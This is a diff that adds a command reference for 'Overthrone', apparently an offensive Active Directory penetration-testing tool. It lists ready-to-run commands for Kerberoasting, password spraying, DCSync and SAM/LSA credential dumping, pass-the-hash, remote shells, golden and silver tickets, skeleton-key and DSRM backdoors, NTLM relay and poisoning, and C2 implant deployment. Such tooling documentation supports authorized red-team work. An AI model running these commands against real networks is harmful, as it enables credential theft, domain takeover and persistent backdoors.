@@ -1,0 +1,86 @@
+# Overthrone (OVT) Complete Command Reference
+
+All commands work as both `overthrone <cmd>` and `ovt <cmd>`.
+
+## Enumeration
+- `ovt enum all -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Enumerate everything
+- `ovt enum users` — Users only
+- `ovt enum groups` — Groups + membership
+- `ovt enum computers` — Computer accounts
+- `ovt enum acl` — Full ACL/DACL analysis
+- `ovt enum delegation` — Unconstrained / constrained / RBCD
+- `ovt enum trusts` — Domain trust mapping
+- `ovt enum policy -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Password/lockout policy
+- `ovt enum laps` — LAPS v1 + v2 encrypted
+- `ovt enum gpp` — GPP passwords from SYSVOL
+- `ovt enum spns` — SPN enumeration (Kerberoasting candidates)
+- `ovt enum pre -H <DC>` — No-creds AD service triage
+- `ovt enum anonymous -H <DC>` — Anonymous LDAP RootDSE probe
+- `ovt reaper -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Deep reaper enumeration engine
+- `ovt rid -H <TARGET>` — RID cycling (null session user enumeration)
+- `ovt scan --targets <IPs> --ldap --smb` — Network discovery
+- `ovt snaffler -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Sensitive file discovery
+- `ovt powerview users --identity <username>` — Get-ADUser equivalent
+- `ovt powerview groups --identity "Domain Admins"` — Group membership
+- `ovt guid resolve <GUID>` — Resolve AD ACE GUIDs to human-readable names
+- `ovt laps -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Read LAPS passwords
+- `ovt gpp -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — GPP cpassword decrypt
+
+## Kerberos & Credentials
+- `ovt kerberos roast -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Kerberoasting
+- `ovt kerberos asrep -H <DC> -d <DOMAIN>` — AS-REP roasting
+- `ovt kerberos user-enum -H <DC> -d <DOMAIN> --userlist users.txt` — Zero-creds user enum
+- `ovt kerberos tgt -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Request TGT
+- `ovt kerberos tgs -H <DC> -d <DOMAIN> -u <USER> --spn <SPN>` — Request TGS
+- `ovt spray -H <DC> -d <DOMAIN> --userlist users.txt --password "Summer2025!"` — Password spray
+- `ovt crack --hashes hashes.txt --wordlist /usr/share/wordlists/rockyou.txt` — Offline cracking
+- `ovt crack --hashes hashes.txt --rules` — Rule-based cracking
+- `ovt dump -t <DC> ntds -d <DOMAIN> -u <DA> -p <PASS>` — DCSync / NTDS.dit dump
+- `ovt dump -t <TARGET> sam` — Local SAM dump
+- `ovt secrets -t <TARGET> -u <USER> -p <PASS>` — LSA secrets + cached creds
+
+## Lateral Movement
+- `ovt exec -t <TARGET> -c "whoami" -d <DOMAIN> -u <ADMIN>` — Remote exec (auto-selects)
+- `ovt exec -t <TARGET> -c "whoami" --method psexec` — PsExec
+- `ovt exec -t <TARGET> -c "whoami" --method smbexec` — SmbExec (quieter)
+- `ovt exec -t <TARGET> -c "whoami" --method winrm` — WinRM
+- `ovt exec -t <TARGET> --nt-hash <HASH> -u <USER> -d <DOMAIN>` — Pass-the-Hash
+- `ovt shell -t <TARGET> -d <DOMAIN> -u <ADMIN> -p <PASS>` — Interactive remote shell
+- `ovt smb -t <TARGET> --list-shares` — SMB share enumeration
+- `ovt smb -t <TARGET> --get <path>` — Download file from SMB share
+- `ovt move trust -H <DC> -d <DOMAIN> -u <USER> --target-domain <DOMAIN2>` — Cross-domain trust
+- `ovt mssql -H <SQLSERVER> -d <DOMAIN> -u <USER>` — MSSQL enum + xp_cmdshell
+
+## Persistence & Forge
+- `ovt forge golden --krbtgt-hash <HASH> -d <DOMAIN> --user "Administrator"` — Golden Ticket
+- `ovt forge silver --service-hash <HASH> --spn <SPN> -d <DOMAIN>` — Silver Ticket
+- `ovt forge diamond --tgt <FILE> --krbtgt-hash <HASH>` — Diamond Ticket (stealth)
+- `ovt forge shadow-creds -t <TARGET> -H <DC> -d <DOMAIN> -u <USER>` — Shadow Credentials
+- `ovt forge acl-backdoor -t <TARGET_OBJECT> --grant-all --user <BACKDOOR_USER>` — DACL backdoor
+- `ovt forge skeleton-key -t <DC> -d <DOMAIN> -u <DA> -p <PASS>` — Skeleton Key
+- `ovt forge dsrm -t <DC> -d <DOMAIN> -u <DA> -p <PASS>` — DSRM backdoor
+- `ovt forge cleanup` — Roll back all persistence
+
+## ADCS
+- `ovt adcs enum -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — ADCS vulnerability scan (ESC1-ESC16)
+- `ovt adcs exploit --esc 1 --template <TEMPLATE> -H <DC> -d <DOMAIN>` — Exploit specific ESC
+
+## NTLM
+- `ovt ntlm relay --target <TARGET> --listen 0.0.0.0` — NTLM relay engine
+- `ovt ntlm poison --interface eth0` — LLMNR/NBT-NS/mDNS poisoner
+
+## Attack Graph
+- `ovt graph build -H <DC> -d <DOMAIN> -u <USER> -p <PASS>` — Build attack graph
+- `ovt graph view --file attack_graph.json` — TUI graph viewer
+- `ovt graph tree --file attack_graph.json` — Hierarchy viewer
+- `ovt graph gui -i ./graphs/` — Browser-based D3/WebGL GUI (no Neo4j)
+- `ovt graph path -i graph.json --from <USER> --to "Domain Admins"` — Shortest path
+- `ovt graph path-to-da -i graph.json --from <USER>` — All paths to DA
+- `ovt graph stats -i graph.json` — Domain statistics summary
+
+## Infrastructure
+- `ovt doctor` — Health check (config, clock skew, LDAP connectivity, DoH)
+- `ovt completions bash/zsh/fish` — Shell tab completion
+- `ovt report -i session.json --format pdf -o report.pdf` — Generate engagement report
+- `ovt report --format markdown` — Markdown report
+- `ovt c2 deploy --framework sliver --host <LHOST>` — Deploy C2 implant
